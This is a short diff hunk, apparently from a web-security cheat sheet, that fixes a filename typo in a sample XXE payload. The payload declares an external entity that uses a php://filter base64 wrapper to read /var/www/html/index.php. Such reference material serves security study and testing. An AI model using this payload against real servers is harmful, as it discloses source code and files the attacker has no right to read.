@@ -16,7 +16,7 @@
 
 ```xml
 <!DOCTYPE kaibro[
-    <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.ph">
+    <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">
 ]>
 <root>&xxe;</root>
 ```
